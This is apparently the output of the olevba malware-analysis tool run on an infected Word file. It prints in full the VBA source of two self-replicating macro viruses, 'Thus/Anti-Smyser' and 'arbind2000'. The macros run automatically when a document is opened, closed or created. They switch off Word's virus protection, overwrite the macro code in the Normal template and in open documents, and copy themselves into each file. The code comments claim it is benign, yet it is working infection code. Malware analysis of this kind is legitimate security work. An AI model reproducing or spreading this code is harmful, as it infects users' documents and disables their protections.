olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-62223a102e6a5bd3c789b90069699a2381dfd1a5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-62223a102e6a5bd3c789b90069699a2381dfd1a5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub








































































































































-------------------------------------------------------------------------------
VBA MACRO Arbind2000.bas 
in file: Virus.MSWord.Thus-based-62223a102e6a5bd3c789b90069699a2381dfd1a5 - OLE stream: 'Macros/VBA/Arbind2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'arbind2000
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim X As Integer
  Dim found As Boolean
  found = False
  X = 1
  For X = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(X).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next X
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "arbind2000", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  X = 1
  For X = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(X).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next X
  If Not found Then
    NormalTemplate.VBProject.VBComponents("arbind2000").Export ("c:\arbind2000.tmp")
    ActiveDocument.VBProject.VBComponents.import ("c:\arbind2000.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\arbind2000.tmp")
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

